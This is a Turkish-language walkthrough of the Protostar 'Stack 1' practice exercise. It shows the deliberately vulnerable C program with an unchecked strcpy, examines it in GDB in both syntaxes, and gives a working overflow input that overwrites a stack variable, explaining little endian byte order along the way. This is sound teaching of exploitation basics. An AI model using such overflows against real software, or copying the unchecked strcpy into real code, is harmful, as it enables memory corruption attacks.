---
title: "Stack 1"
etiketler : "Protostar"
seriler: "Protostar"
sakla  : false
---

## Stack1.c
``` C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

**Amaç:** "you have correctly got the variable to the right value" satırını yazdırmak.

Bu seviyede de istediğiğimiz cümleyi yazdırabilmek için programın akışını daha
spesifik bir şekilde değiştirmemiz gerekiyor. Önceki seviyede *modified*
değişkeni *0* haricinde bir değer olması yeterken şimdi *0x61626364* değerine
eşit olması gerekmekte.

## Programın çalıştırılması
``` shell
user@protostar:/opt/protostar/bin$ ./stack1
stack1: please specify an argument

user@protostar:/opt/protostar/bin$ ./stack1 Merhaba
Try again, you got 0x00000000
```

Program çalıştırıldığı zaman bir önceki seviyedeki gibi herhangi bir input
beklemeden argüman belirtiniz çıktısı veriyor. Herhangi bir argüman verdiğim
zaman ise Tekrar deneyin diyip o anki modified değişkeninin değerini hex olarak
yazdırıyor. Bu seviyeyide aynı şekilde uzun bir değer verdikten sonra
geçebiliriz. Fakat gdb (gnu debugger)'dan bahsetmek istiyorum. GDB ile bir
programı açıp satır satır assembly kodlarını inceleyebilir, değişiklik yapabilir
veya programın akışını değiştirebiliriz.

## GDB ve AT&T Sentaks
Aşağıdaki çıktıyı biraz yorumlayarak basitleştirmek gerekirse. Sol taraftaki
*0x* ile başlayan 16lı tabanındaki sayılar, sağ tarafındaki opcode ve
argüman(lar)'ın saklandığı hafıza adresleridir.

Şuan sağdaki argümanlar biraz göz korkutucu görünebilir bunun yerine şu anda
varsayılan olan AT&T sentaksını intel ile değiştireceğim.

``` shell
user@protostar:/opt/protostar/bin$ gdb stack1
Reading symbols from /opt/protostar/bin/stack1...done.
(gdb) b main
Breakpoint 1 at 0x804846d: file stack1/stack1.c, line 11.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048464 <main+0>:    push   %ebp
0x08048465 <main+1>:    mov    %esp,%ebp
0x08048467 <main+3>:    and    $0xfffffff0,%esp
0x0804846a <main+6>:    sub    $0x60,%esp
0x0804846d <main+9>:    cmpl   $0x1,0x8(%ebp)
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   movl   $0x80485a0,0x4(%esp)
0x0804847b <main+23>:   movl   $0x1,(%esp)
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   movl   $0x0,0x5c(%esp)
0x0804848f <main+43>:   mov    0xc(%ebp),%eax
0x08048492 <main+46>:   add    $0x4,%eax
0x08048495 <main+49>:   mov    (%eax),%eax
0x08048497 <main+51>:   mov    %eax,0x4(%esp)
0x0804849b <main+55>:   lea    0x1c(%esp),%eax
0x0804849f <main+59>:   mov    %eax,(%esp)
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    0x5c(%esp),%eax
0x080484ab <main+71>:   cmp    $0x61626364,%eax
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   movl   $0x80485bc,(%esp)
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    0x5c(%esp),%edx
0x080484c4 <main+96>:   mov    $0x80485f3,%eax
0x080484c9 <main+101>:  mov    %edx,0x4(%esp)
0x080484cd <main+105>:  mov    %eax,(%esp)
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
End of assembler dump.
```

## GDB İntel Sentaks
Intel sentaksına geçmek için gdb de `set disassembly-flavor intel` yazıp
tekrardan main fonksiyonunun makina kodlarını assembly kodlarına çeviriyorum.
-disassemble-

``` shell
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
End of assembler dump.
```

Virgül yerine boşluk görmek ve registerların başında *%* görmemek okumayı
kolaylaştırıyor. İki sentaksın aralarındaki tek fark bu değil aynı zamanda
assign yani atama yapılan yerde değişiyor.

**Intel Sentaks**
| opcode | hedef,kaynak |
| mov    | eax,[ecx]    |

**AT&T Sentaks**
| opcode | kaynak,hedef |
| movl   | (%ecx),%eax  |

## Modified Değişkenini Değiştirilmesi
Aşağıdaki gibi bir kaç şekilde stack1 programına argüman yollayabiliriz.
``` shell
user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA #64 tane A
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print('A'*64)")
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
Try again, you got 0x00000043
user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
Try again, you got 0x43434343
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print('A'*64+'CCCC')")
Try again, you got 0x43434343
user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEFG
Try again, you got 0x47464544
```

Bir önceki seviyede olduğu gibi 64 tane A(0x41) harfiyle bufferi dolduruyorum.
Bunu daha kısa bir şekilde pythondan yardım alarak doldurabileceğimi
söylemiştim. Burada dikkat çekmek istediğim son iki örnekte modified variable
yerine istediğimi yazdırabiliyor oluşum. Fakat yazdırırken dikkat etmem gereken
bir nokta sondan bir önceki 64 tane A ve *bir* tane C olan örnekte değerim
**0x00000043** olması. Yani benim her modified değişkenine yazdığım harf tersten
gözüküyor bunun sebebi bizim *Big Endian* olarak düşünmemiz ama makinaların
**Little Endian** olarak çalışmasından kaynaklanıyor. Aralarındaki temel fark en
kıymetli bitin solda yada sağda olmasıdır.

Madem istediğimiz şekilde modified değişkenini değiştirebiliyoruz o zaman bizden
istenen değeri yazmayı deniyelim. [[#Stack1.c|Stack1.c]]'deki
`if(modified==0x61626364)` değerine bakacak olursak. *0x61626364* değerini
modified değişkenine yazmak için bu sayıların ascii karşılığına pythondan yardım
alarak buluyorum.

``` shell
$ python3
Python 3.7.1 (default, Oct 22 2018, 10:41:28)
[GCC 8.2.1 20180831] on linux
>>> chr(0x61)
'a'
>>> chr(0x62)
'b'
>>> chr(0x63)
'c'
>>> chr(0x64)
'd'
```

Demek ki ben 64lük buffer'ı doldurduktan sonra *abcd* yazarsam bölümü
geçebilirim.
``` shell
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print('A'*64+'abcd')")
Try again, you got 0x64636261
```

**Little Endian**'a dikkat ederek :)

``` shell
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print('A'*64+'dcba')")
you have correctly got the variable to the right value
```

----
## GDB hook-stop
GDB'de hook-stop denilen programın akışı her durdurulduğunda istediğimiz
komutları sanki o komutları yazmışız gibi çalıştıran bir komut seti kuralı
yazabiliriz.

``` shell
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers # register'ların durumunu gösterir
>x/i $eip # bir sonraki çalıştırılacak komutu gösterir
>x/16wx $esp # Stack'in durumunu 16word olarak gösterir
>end
```

**1 word 4byte olarak gdb içinde tanımlanmıştır.**

[Stack 0](../stack0)'da bahsettiğim gibi stack lokal değişkenlerin tutulduğu bir
veri yapısıdır. Bu sayede bir programın içerisinde aynı değişken ismi farklı
fonksiyonlar içerisinde yer alabilir.

Örnek vermek gerekirse programın içinde birden fazla *i* değişkeni olmasına
rağmen bir fonksiyonun içerisinde sadece tek *i* değişkeni bulunabilir. Bunun
olmasını sağlayan stack frame denilen, her fonksiyon için kendine ait bir stack
alanının bulunmasıdır.

``` shell
user@protostar:/opt/protostar/bin$ gdb stack1 -q # -q Banneri görmemek için
Reading symbols from /opt/protostar/bin/stack1...done.
(gdb) set disassembly-flavor intel
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/i $eip
>x/16wx $esp
>end
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
eax            0x61626364       1633837924
ecx            0x0      0
edx            0x45     69
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff758       0xbffff758
esi            0x0      0
edi            0x0      0
eip            0x80484b9        0x80484b9 <main+85>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484b9 <main+85>:    call   0x8048398 <puts@plt>
0xbffff6f0:     0x080485bc      0xbffff93e      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0x080484b9      19      in stack1/stack1.c
(gdb) ni
...
... Aşağıdaki mesajı görene kadar ni yazıp stacke bakalım
...
you have correctly got the variable to the right value
(gdb) x/24wx $esp
0xbffff6f0:     0x080485bc      0xbffff93e      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x61626364
```

Görüldüğü gibi 4 satır 0x41414141 ile dolu ve en sonda da bizim *0x61626364*
yazdığımız dcba değeri bulunmakta. Her bir 0x41414141 4 byte olup toplam 16 tane
word olduğunu hesaplarsak bu programdaki 64byte olan buffer'ı doldurduğumuzu
görebiliriz. Sonrasındaki *0x61626364* modified değişkeni oluyor.

Bunu şu şekilde ispatlayabiliriz sadece 64byte'lık bir payload ile
çalıştırdığımızda stackteki modified değişkeninin bulunduğu adresin 0 olmasını
bekleriz.

``` shell
... Üstteki gdb örneğinin aynısı. Sadece 68byte yerine
... 64byte'lık payload verdim.

(gdb) x/24wx $esp
0xbffff6f0:     0xbffff70c      0xbffff942      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x00000000
```
